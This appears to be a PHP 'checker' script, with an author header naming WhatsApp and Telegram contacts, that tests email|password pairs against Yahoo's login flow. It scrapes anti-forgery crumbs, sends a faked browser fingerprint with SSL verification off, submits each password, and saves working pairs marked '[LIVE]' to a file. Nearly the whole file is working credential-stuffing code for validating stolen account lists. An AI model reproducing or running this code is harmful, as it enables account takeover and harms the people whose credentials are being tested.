<?php
/*
* @𝓐𝓾𝓽𝓱𝓸𝓻   𝓟 𝓾 𝓰 𝓷 𝓸
*
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓦𝓱𝓪𝓽𝓼𝓪𝓹𝓹  >> (61) 9603-7036 
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶  >> 𝓽.𝓶𝓮/𝓹𝓾𝓰𝓷𝓸_𝓯𝓬
*
*/
error_reporting(0);

if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

function trazer($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$total = strlen($ano);
if ($total > 2){
  $ano = substr($ano, 2,4);
}

$url = 'https://login.yahoo.com/';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array());

$p1 = curl_exec($ch);
$crumb  = trazer($p1,'crumb" value="','"');
$acrumb  = trazer($p1,'acrumb" value="','"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: login.yahoo.com'
  ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'browser-fp-data=%7B%22language%22%3A%22pt-BR%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A180%2C%22timezone%22%3A%22America%2FFortaleza%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11-20.19.15.4352)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A41%2C%22hash%22%3A%223f6e159ddfdc97a8d2ef74c08f7af5a2%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%22768%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22738%22%2C%22h%22%3A%221366%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1646870788049%2C%22render%22%3A1646870791789%7D%7D&crumb='.$crumb.'&acrumb='.$acrumb.'&sessionIndex=Qg--&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Atrue%7D%7D&username='.$email.'&passwd=&signin=Avan%C3%A7ar&persistent=y');

 $p1 = curl_exec($ch);


 $url = 'https://login.yahoo.com/account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&sessionIndex=QQ--&acrumb='.$acrumb.'&display=login&authMechanism=primary';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: login.yahoo.com'
  ));

echo $p1 = curl_exec($ch);exit();

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: login.yahoo.com'
  ));
curl_setopt($ch, CURLOPT_POSTFIELDS, "browser-fp-data=%7B%22language%22%3A%22pt-BR%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A180%2C%22timezone%22%3A%22America%2FFortaleza%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google+Inc.+%28Intel%29%7EANGLE+%28Intel%2C+Intel%28R%29+HD+Graphics+Direct3D11+vs_5_0+ps_5_0%2C+D3D11-20.19.15.4352%29%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A41%2C%22hash%22%3A%223f6e159ddfdc97a8d2ef74c08f7af5a2%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%22768%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22738%22%2C%22h%22%3A%221366%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1643243245977%2C%22render%22%3A1643243246083%7D%7D&crumb=$crumb&acrumb=$acrumb&sessionIndex=QQ--&displayName=$email&username=$email&passwordContext=normal&isShowButtonClicked=true&showButtonStatus=true&prefersReducedMotion=true&password=$senha&verifyPassword=Seguinte");

 echo $p1 = curl_exec($ch);



exit();
if (strpos($p1,'Assuntos do momento')) {
  echo "[LIVE] $email|$senha";

  $fp = fopen("Aprovados/live.txt","w");
  fwrite($fp,$email."|".$senha."\n");
  fclose($fp);
}else{
  echo "[X] Erro  $email|$senha";
}